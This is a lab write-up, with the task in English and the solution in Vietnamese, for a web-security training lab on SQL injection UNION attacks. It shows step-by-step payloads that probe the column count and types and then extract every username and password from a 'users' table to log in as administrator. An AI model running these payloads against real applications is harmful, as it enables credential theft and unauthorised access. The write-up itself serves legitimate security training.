# **Lab: SQL injection UNION attack, retrieving data from other tables**
>  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.  
 The database contains a different table called `users`, with columns called `username` and `password`.  
  To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.  

  # **Solution**
  Bắt đầu nhìn tổng thể trang web ta thấy được có các nội dung gồm tiêu đề và văn bản chính. Có thể đoán được truy vấn ít nhất có 2 cột và đều là kiểu dữ liệu chuỗi kí tự.

Truy cập một trang liên kết bất kì để bắt đầu chèn UNION vào tham số bộ lọc từ đó xác định chính xác số cột truy vấn trả về và kiểu dữ liệu của các cột đó:

```
https://0ae6006d04fceb7980031c7900e000a4.web-security-academy.net/filter?category=Pets
```

```
'UNION SELECT NULL, NULL -- 
```

Qua bước trên, ta xác định được số cột truy vấn trả về là 2.

```
' UNION SELECT 'a', 'a' --
```

Thay giá trị NULL thành 'a'. Ta xác định chính xác rằng cả 2 cột đều là kiểu dữ liệu chuỗi kí tự. Tiếp đó ta bắt đầu thực hiện truy vấn tới bảng `users`.

Như đề bài đã cho thì ta có bảng `users` gồm 2 cột `username` và `password`.

```
' UNION SELECT username,password FROM users -- 
```

Từ đó ta thu được dữ liệu từ bảng `users`. Sử dụng thông tin tài khoản `administrator` để đăng nhập và hoàn thành nhiệm vụ thôi.

![image](https://i.pinimg.com/originals/5f/39/e6/5f39e6d606da1c3d603bdabfccf053f3.jpg)